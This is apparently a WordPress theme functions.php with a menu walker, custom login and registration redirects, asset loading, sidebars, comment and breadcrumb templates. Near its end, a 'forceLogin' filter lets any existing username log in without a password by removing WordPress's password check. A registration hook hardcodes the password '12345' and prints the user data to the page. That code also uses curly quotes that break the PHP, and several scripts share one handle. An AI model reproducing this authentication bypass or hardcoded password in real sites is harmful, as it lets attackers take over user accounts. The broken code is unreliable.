<?php

 class CSS_Menu_Walker extends Walker {

	var $db_fields = array('parent' => 'menu_item_parent', 'id' => 'db_id');
	
	function start_lvl(&$output, $depth = 0, $args = array()) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul>\n";
	}
	
	function end_lvl(&$output, $depth = 0, $args = array()) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}
	
	function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
	
		global $wp_query;
		$indent = ($depth) ? str_repeat("\t", $depth) : '';
		$class_names = $value = '';
		$classes = empty($item->classes) ? array() : (array) $item->classes;
		
		/* Add active class */
		if (in_array('current-menu-item', $classes)) {
			$classes[] = 'active';
			unset($classes['current-menu-item']);
		}
		
		/* Check for children */
		$children = get_posts(array('post_type' => 'nav_menu_item', 'nopaging' => true, 'numberposts' => 1, 'meta_key' => '_menu_item_menu_item_parent', 'meta_value' => $item->ID));
		if (!empty($children)) {
			$classes[] = 'has-sub';
		}
		
		$class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item, $args));
		$class_names = $class_names ? ' class="' . esc_attr($class_names) . '"' : '';
		
		$id = apply_filters('nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args);
		$id = $id ? ' id="' . esc_attr($id) . '"' : '';
		
		$output .= $indent . '<li' . $id . $value . $class_names .'>';
		
		$attributes  = ! empty($item->attr_title) ? ' title="'  . esc_attr($item->attr_title) .'"' : '';
		$attributes .= ! empty($item->target)     ? ' target="' . esc_attr($item->target    ) .'"' : '';
		$attributes .= ! empty($item->xfn)        ? ' rel="'    . esc_attr($item->xfn       ) .'"' : '';
		$attributes .= ! empty($item->url)        ? ' href="'   . esc_attr($item->url       ) .'"' : '';
		
		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'><span>';
		$item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
		$item_output .= '</span></a>';
		$item_output .= $args->after;
		
		$output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
	}
	
	function end_el(&$output, $item, $depth = 0, $args = array()) {
		$output .= "</li>\n";
	}
}





function cubiq_login_init () {
    $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';

    if ( isset( $_POST['wp-submit'] ) ) {
        $action = 'post-data';
    } else if ( isset( $_GET['reauth'] ) ) {
        $action = 'reauth';
    } else if ( isset($_GET['key']) ) {
        $action = 'resetpass-key';
    }

    // redirect to change password form
    if ( $action == 'rp' || $action == 'resetpass' ) {
        wp_redirect( home_url('/login/?action=resetpass') );
        exit;
    }

    // redirect from wrong key when resetting password
    if ( $action == 'lostpassword' && isset($_GET['error']) && ( $_GET['error'] == 'expiredkey' || $_GET['error'] == 'invalidkey' ) ) {
        wp_redirect( home_url( '/login/?action=forgot&failed=wrongkey' ) );
        exit;
    }

    if (
        $action == 'post-data'        ||            // don't mess with POST requests
        $action == 'reauth'           ||            // need to reauthorize
        $action == 'resetpass-key'    ||            // password recovery
        $action == 'logout'                         // user is logging out
    ) {
        return;
    }

    wp_redirect( home_url( '/login/' ) );
    exit;
}
add_action('login_init', 'cubiq_login_init');





function cubiq_template_redirect () {
    if ( is_page( 'login' ) && is_user_logged_in() ) {
        wp_redirect( home_url( '/user/' ) );
        exit();
    }

    if ( is_page( 'user' ) && !is_user_logged_in() ) {
        wp_redirect( home_url( '/login/' ) );
        exit();
    }
}
add_action( 'template_redirect', 'cubiq_template_redirect' );


function cubiq_admin_init () {
    if ( current_user_can( 'subscriber' ) && !defined( 'DOING_AJAX' ) ) {
        wp_redirect( home_url('/user/') );
        exit;
    }
}
add_action( 'admin_init', 'cubiq_admin_init' );





function cubiq_registration_redirect ($errors, $sanitized_user_login, $user_email) {

    // don't lose your time with spammers, redirect them to a success page
    if ( !isset($_POST['confirm_email']) || $_POST['confirm_email'] !== '' ) {

        wp_redirect( home_url('/login/') . '?action=register&success=1' );
        exit;

    }

    if ( !empty( $errors->errors) ) {
        if ( isset( $errors->errors['username_exists'] ) ) {

            wp_redirect( home_url('/login/') . '?action=register&failed=username_exists' );

        } else if ( isset( $errors->errors['email_exists'] ) ) {

            wp_redirect( home_url('/login/') . '?action=register&failed=email_exists' );

        } else if ( isset( $errors->errors['empty_username'] ) || isset( $errors->errors['empty_email'] ) ) {

            wp_redirect( home_url('/login/') . '?action=register&failed=empty' );

        } else if ( !empty( $errors->errors ) ) {

            wp_redirect( home_url('/login/') . '?action=register&failed=generic' );

        }

        exit;
    }

    return $errors;

}
add_filter('registration_errors', 'cubiq_registration_redirect', 10, 3);




function cubiq_login_redirect ($redirect_to, $url, $user) {

    if ( !isset($user->errors) ) {
        return $redirect_to;
    }

    wp_redirect( home_url('/login/') . '?action=login&failed=1');
    exit;

}
add_filter('login_redirect', 'cubiq_login_redirect', 10, 3);


function cubiq_reset_password () {
    $user_data = '';

    if ( !empty( $_POST['user_login'] ) ) {
        if ( strpos( $_POST['user_login'], '@' ) ) {
            $user_data = get_user_by( 'email', trim($_POST['user_login']) );
        } else {
            $user_data = get_user_by( 'login', trim($_POST['user_login']) );
        }
    }

    if ( empty($user_data) ) {
        wp_redirect( home_url('/login/') . '?action=forgot&failed=1' );
        exit;
    }
}
add_action( 'lostpassword_post', 'cubiq_reset_password');




function cubiq_validate_password_reset ($errors, $user) {
    // passwords don't match
    if ( $errors->get_error_code() ) {
        wp_redirect( home_url('/login/?action=resetpass&failed=nomatch') );
        exit;
    }

    // wp-login already checked if the password is valid, so no further check is needed
    if ( !empty( $_POST['pass1'] ) ) {
        reset_password($user, $_POST['pass1']);

        wp_redirect( home_url('/login/?action=resetpass&success=1') );
        exit;
    }

    // redirect to change password form
    wp_redirect( home_url('/login/?action=resetpass') );
    exit;
}
add_action('validate_password_reset', 'cubiq_validate_password_reset', 10, 2);





// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );
	



if (!isset($content_width)) {
    $content_width = 770;
}


/**
 * Setup Theme Functions
 *
 */
if (!function_exists('bootstrapwp_theme_setup')):
    function bootstrapwp_theme_setup() {

        load_theme_textdomain('bootstrapwp', get_template_directory() . '/lang');

        add_theme_support('automatic-feed-links');
        add_theme_support('post-thumbnails');
        add_theme_support('post-formats', array( 'aside', 'image', 'gallery', 'link', 'quote', 'status', 'video', 'audio', 'chat' ));

    }
endif;
add_action('init', 'bootstrapwp_theme_setup');




/**
 * Define post thumbnail size.
 * Add two additional image sizes.
 *
 */
function bootstrapwp_images() {

    set_post_thumbnail_size(260, 180); // 260px wide x 180px high
    add_image_size('bootstrap-small', 300, 200); // 300px wide x 200px high
    add_image_size('bootstrap-medium', 360, 270); // 360px wide by 270px high
}

/**
 * Load CSS styles for theme.
 *
 */
function bootstrapwp_styles_loader() {

    wp_enqueue_style('bootstrapwp-style', get_template_directory_uri() . '/assets/css/bootstrapwp.css', false, '1.0', 'all');

    wp_enqueue_style('bootstrapwp-default', get_stylesheet_uri());

    // registering scripts and styles for documentation templates
    wp_register_style('docs-css', get_template_directory_uri() . '/templates-documentation/assets/css/docs.css', array('bootstrapwp-style'), '2.3.2', 'all');

}
add_action('wp_enqueue_scripts', 'bootstrapwp_styles_loader');



function add_theme_scripts() {
  wp_enqueue_style( 'style', get_stylesheet_uri() );
 
  wp_enqueue_style( 'slider', get_template_directory_uri() . '/assets/css/bootstrap-grid.css', array(), '1.1', 'all');
  wp_enqueue_style( 'home622a', get_template_directory_uri() . '/assets/css/home622a.css', array(), '1.1', 'all');
   

}
add_action( 'wp_enqueue_scripts', 'add_theme_scripts' );



/**
 * Load JavaScript and jQuery files for theme.
 *
 */
function bootstrapwp_scripts_loader() {

    if (is_singular() && comments_open() && get_option('thread_comments')) {

        wp_enqueue_script('comment-reply');

    }

wp_enqueue_script('recaptcha-js', 'https://www.google.com/recaptcha/api.js', array(), '1.0', true);


    wp_enqueue_script('bootstrap-js', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array(), '1.0', true);
    wp_enqueue_script('demo-js', get_template_directory_uri() . '/assets/js/bootstrapwp.demo.js', array(),'1.0',true);
	

    wp_enqueue_script('jqueryb8ff', get_template_directory_uri() . '/assets/js/jqueryb8ff.js', array(), '1.0', true);
    wp_enqueue_script('jquery-migrate.min330a', get_template_directory_uri() . '/assets/js/jquery-migrate.min330a.js', array(), '1.0', true);
	wp_enqueue_script('customjs', get_template_directory_uri() . '/assets/js/custom-js.js', array(), '1.0', true);
	
	
	
	wp_enqueue_script('customjs', get_template_directory_uri() . '/assets/js/jquery.min.js', array(), '1.0', true);
	wp_enqueue_script('customjs', get_template_directory_uri() . '/assets/js/all.js', array(), '1.0', true);
	
	


}
add_action('wp_enqueue_scripts', 'bootstrapwp_scripts_loader');



function remove_cssjs_ver( $src ) {
    if( strpos( $src, '?ver=' ) )
        $src = remove_query_arg( 'ver', $src );
    return $src;
}
add_filter( 'style_loader_src', 'remove_cssjs_ver', 10, 2 );
add_filter( 'script_loader_src', 'remove_cssjs_ver', 10, 2 );



/**
 * Define theme's widget areas.
 *
 */
function bootstrapwp_widgets_init() {

    register_sidebar(
        array(
            'name'          => __('Page Sidebar', 'bootstrapwp'),
            'id'            => 'sidebar-page',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => "</div>",
            'before_title'  => '<h4 class="widget-title">',
            'after_title'   => '</h4>',
        )
    );

    register_sidebar(
        array(
            'name'          => __('Posts Sidebar', 'bootstrapwp'),
            'id'            => 'sidebar-posts',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => "</div>",
            'before_title'  => '<h4 class="widget-title">',
            'after_title'   => '</h4>',
        )
    );

    register_sidebar(
        array(
            'name'          => __('Home Left', 'bootstrapwp'),
            'id'            => 'home-left',
            'description'   => __('Left textbox on homepage', 'bootstrapwp'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h2>',
            'after_title'   => '</h2>'
        )
    );

    register_sidebar(
        array(
            'name'          => __('Home Middle', 'bootstrapwp'),
            'id'            => 'home-middle',
            'description'   => __('Middle textbox on homepage', 'bootstrapwp'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h2>',
            'after_title'   => '</h2>'
        )
    );

    register_sidebar(
        array(
            'name'          => __('Home Right', 'bootstrapwp'),
            'id'            => 'home-right',
            'description'   => __('Right textbox on homepage', 'bootstrapwp'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h2>',
            'after_title'   => '</h2>'
        )
    );

    register_sidebar(
        array(
            'name'          => __('Footer Content', 'bootstrapwp'),
            'id'            => 'footer-content',
            'description'   => __('Footer text or acknowledgements', 'bootstrapwp'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h4>',
            'after_title'   => '</h4>'
        )
    );

}
add_action('init', 'bootstrapwp_widgets_init');


/**
 * Display page next/previous navigation links.
 *
 */
if (!function_exists('bootstrapwp_content_nav')):
    function bootstrapwp_content_nav($nav_id) {

        global $wp_query, $post;

        if ($wp_query->max_num_pages > 1) : ?>

        <nav id="<?php echo $nav_id; ?>" class="navigation" role="navigation">
            <h3 class="assistive-text"><?php _e('Post navigation', 'bootstrapwp'); ?></h3>
            <div class="nav-previous alignleft"><?php next_posts_link(
                __('<span class="meta-nav">&larr;</span> Older posts', 'bootstrapwp')
            ); ?></div>
            <div class="nav-next alignright"><?php previous_posts_link(
                __('Newer posts <span class="meta-nav">&rarr;</span>', 'bootstrapwp')
            ); ?></div>
        </nav><!-- #<?php echo $nav_id; ?> .navigation -->

        <?php endif;
    }
endif;

/**
 * Display template for comments and pingbacks.
 *
 */
if (!function_exists('bootstrapwp_comment')) :
    function bootstrapwp_comment($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment;
        switch ($comment->comment_type) :
            case 'pingback' :
            case 'trackback' : ?>

                <li class="comment media" id="comment-<?php comment_ID(); ?>">
                    <div class="media-body">
                        <p>
                            <?php _e('Pingback:', 'bootstrapwp'); ?> <?php comment_author_link(); ?>
                        </p>
                    </div><!--/.media-body -->
                <?php
                break;
            default :
                // Proceed with normal comments.
                global $post; ?>

                <li class="comment media" id="li-comment-<?php comment_ID(); ?>">
                        <a href="<?php echo $comment->comment_author_url;?>" class="pull-left">
                            <?php echo get_avatar($comment, 64); ?>
                        </a>
                        <div class="media-body">
                            <h4 class="media-heading comment-author vcard">
                                <?php
                                printf('<cite class="fn">%1$s %2$s</cite>',
                                    get_comment_author_link(),
                                    // If current post author is also comment author, make it known visually.
                                    ($comment->user_id === $post->post_author) ? '<span class="label"> ' . __(
                                        'Post author',
                                        'bootstrapwp'
                                    ) . '</span> ' : ''); ?>
                            </h4>

                            <?php if ('0' == $comment->comment_approved) : ?>
                                <p class="comment-awaiting-moderation"><?php _e(
                                    'Your comment is awaiting moderation.',
                                    'bootstrapwp'
                                ); ?></p>
                            <?php endif; ?>

                            <?php comment_text(); ?>
                            <p class="meta">
                                <?php printf('<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
                                            esc_url(get_comment_link($comment->comment_ID)),
                                            get_comment_time('c'),
                                            sprintf(
                                                __('%1$s at %2$s', 'bootstrapwp'),
                                                get_comment_date(),
                                                get_comment_time()
                                            )
                                        ); ?>
                            </p>
                            <p class="reply">
                                <?php comment_reply_link( array_merge($args, array(
                                            'reply_text' => __('Reply <span>&darr;</span>', 'bootstrapwp'),
                                            'depth'      => $depth,
                                            'max_depth'  => $args['max_depth']
                                        )
                                    )); ?>
                            </p>
                        </div>
                        <!--/.media-body -->
                <?php
                break;
        endswitch;
    }
endif;


/**
 * Display template for post meta information.
 *
 */
if (!function_exists('bootstrapwp_posted_on')) :
    function bootstrapwp_posted_on()
    {
        printf(__('Posted on <a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s" pubdate>%4$s</time></a><span class="byline"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>','bootstrapwp'),
            esc_url(get_permalink()),
            esc_attr(get_the_time()),
            esc_attr(get_the_date('c')),
            esc_html(get_the_date()),
            esc_url(get_author_posts_url(get_the_author_meta('ID'))),
            esc_attr(sprintf(__('View all posts by %s', 'bootstrapwp'), get_the_author())),
            esc_html(get_the_author())
        );
    }
endif;


/**
 * Adds custom classes to the array of body classes.
 *
 */
function bootstrapwp_body_classes($classes)
{
    if (!is_multi_author()) {
        $classes[] = 'single-author';
    }
    return $classes;
}
add_filter('body_class', 'bootstrapwp_body_classes');


/**
 * Add post ID attribute to image attachment pages prev/next navigation.
 *
 */
function bootstrapwp_enhanced_image_navigation($url)
{
    global $post;
    if (wp_attachment_is_image($post->ID)) {
        $url = $url . '#main';
    }
    return $url;
}
add_filter('attachment_link', 'bootstrapwp_enhanced_image_navigation');


/**
 * Checks if a post thumbnails is already defined.
 *
 */
function bootstrapwp_is_post_thumbnail_set()
{
    global $post;
    if (get_the_post_thumbnail()) {
        return true;
    } else {
        return false;
    }
}


/**
 * Set post thumbnail as first image from post, if not already defined.
 *
 */
function bootstrapwp_autoset_featured_img()
{
    global $post;

    $post_thumbnail = bootstrapwp_is_post_thumbnail_set();
    if ($post_thumbnail == true) {
        return get_the_post_thumbnail();
    }
    $image_args     = array(
        'post_type'      => 'attachment',
        'numberposts'    => 1,
        'post_mime_type' => 'image',
        'post_parent'    => $post->ID,
        'order'          => 'desc'
    );
    $attached_images = get_children($image_args, ARRAY_A);
    $first_image = reset($attached_images);
    if (!$first_image) {
        return false;
    }

    return get_the_post_thumbnail($post->ID, $first_image['ID']);

}


/**
 * Define default page titles.
 *
 */
function bootstrapwp_wp_title($title, $sep)
{
    global $paged, $page;
    if (is_feed()) {
        return $title;
    }
    // Add the site name.
    $title .= get_bloginfo('name');
    // Add the site description for the home/front page.
    $site_description = get_bloginfo('description', 'display');
    if ($site_description && (is_home() || is_front_page())) {
        $title = "$title $sep $site_description";
    }
    // Add a page number if necessary.
    if ($paged >= 2 || $page >= 2) {
        $title = "$title $sep " . sprintf(__('Page %s', 'bootstrapwp'), max($paged, $page));
    }
    return $title;
}
add_filter('wp_title', 'bootstrapwp_wp_title', 10, 2);

/**
 * Display template for breadcrumbs.
 *
 */
function bootstrapwp_breadcrumbs()
{
    $home      = __('Home', 'bootstrapwp'); // text for the 'Home' link
    $before    = '<li class="active">'; // tag before the current crumb
    $sep       = '<span class="divider">/</span>';
    $after     = '</li>'; // tag after the current crumb

    if (!is_home() && !is_front_page() || is_paged()) {

        echo '<ul class="breadcrumb">';

        global $post;
        $homeLink = home_url();
            echo '<li><a href="' . $homeLink . '">' . $home . '</a> '.$sep. '</li> ';
            if (is_category()) {
                global $wp_query;
                $cat_obj   = $wp_query->get_queried_object();
                $thisCat   = $cat_obj->term_id;
                $thisCat   = get_category($thisCat);
                $parentCat = get_category($thisCat->parent);
                if ($thisCat->parent != 0) {
                    echo get_category_parents($parentCat, true, $sep);
                }
                echo $before . __('Archive by category', 'bootstrapwp') . ' "' . single_cat_title('', false) . '"' . $after;
            } elseif (is_day()) {
                echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time(
                    'Y'
                ) . '</a></li> ';
                echo '<li><a href="' . get_month_link(get_the_time('Y'), get_the_time('m')) . '">' . get_the_time(
                    'F'
                ) . '</a></li> ';
                echo $before . get_the_time('d') . $after;
            } elseif (is_month()) {
                echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time(
                    'Y'
                ) . '</a></li> ';
                echo $before . get_the_time('F') . $after;
            } elseif (is_year()) {
                echo $before . get_the_time('Y') . $after;
            } elseif (is_single() && !is_attachment()) {
                if (get_post_type() != 'post') {
                    $post_type = get_post_type_object(get_post_type());
                    $slug      = $post_type->rewrite;
                    echo '<li><a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a></li> ';
                    echo $before . get_the_title() . $after;
                } else {
                    $cat = get_the_category();
                    $cat = $cat[0];
                    echo '<li>'.get_category_parents($cat, true, $sep).'</li>';
                    echo $before . get_the_title() . $after;
                }
            } elseif (!is_single() && !is_page() && get_post_type() != 'post' && !is_404()) {
                $post_type = get_post_type_object(get_post_type());
                echo $before . $post_type->labels->singular_name . $after;
            } elseif (is_attachment()) {
                $parent = get_post($post->post_parent);
                $cat    = get_the_category($parent->ID);
                $cat    = $cat[0];
                echo get_category_parents($cat, true, $sep);
                echo '<li><a href="' . get_permalink(
                    $parent
                ) . '">' . $parent->post_title . '</a></li> ';
                echo $before . get_the_title() . $after;

            } elseif (is_page() && !$post->post_parent) {
                echo $before . get_the_title() . $after;
            } elseif (is_page() && $post->post_parent) {
                $parent_id   = $post->post_parent;
                $breadcrumbs = array();
                while ($parent_id) {
                    $page          = get_page($parent_id);
                    $breadcrumbs[] = '<li><a href="' . get_permalink($page->ID) . '">' . get_the_title(
                        $page->ID
                    ) . '</a>' . $sep . '</li>';
                    $parent_id     = $page->post_parent;
                }
                $breadcrumbs = array_reverse($breadcrumbs);
                foreach ($breadcrumbs as $crumb) {
                    echo $crumb;
                }
                echo $before . get_the_title() . $after;
            } elseif (is_search()) {
                echo $before . __('Search results for', 'bootstrapwp') . ' "'. get_search_query() . '"' . $after;
            } elseif (is_tag()) {
                echo $before . __('Posts tagged', 'bootstrapwp') . ' "' . single_tag_title('', false) . '"' . $after;
            } elseif (is_author()) {
                global $author;
                $userdata = get_userdata($author);
                echo $before . __('Articles posted by', 'bootstrapwp') . ' ' . $userdata->display_name . $after;
            } elseif (is_404()) {
                echo $before . __('Error 404', 'bootstrapwp') . $after;
            }
            // if (get_query_var('paged')) {
            //     if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author()
            //     ) {
            //         echo ' (';
            //     }
            //     echo __('Page', 'bootstrapwp') . $sep . get_query_var('paged');
            //     if (is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author()
            //     ) {
            //         echo ')';
            //     }
            // }

        echo '</ul>';

    }
}


/**
 * This theme was built with PHP, Semantic HTML, CSS, love, and a bootstrap.**/
 

require_once( get_template_directory() . '/libs/custom-ajax-auth.php' );




function forceLogin($user,$username,$password)
{
if(username_exists($username))
{
$user=get_user_by(‘login’,$username);
remove_action(‘authenticate’, ‘wp_authenticate_username_password’, 20);
return $user;
}
}



add_filter(‘authenticate’,’forceLogin’,0,3);


 /**
 * Registering a new user.
 */
add_action('template_redirect', 'register_user');
 
function register_user(){
	
	if(isset($_REQUEST["fbid"]) && isset($_REQUEST["fbname"])):
	$id=$_REQUEST["fbid"];
$fname=$_REQUEST["fbname"];


    $info = array();
  	$info['user_nicename'] = $info['nickname'] = $info['display_name'] = $info['first_name'] = $info['user_login'] = $_REQUEST["name"] ;
	
    $info['user_pass'] = '12345';
	$info['user_email'] = $_POST['email'];
	
	print_r($info);
	
	else:
	
	endif;

}
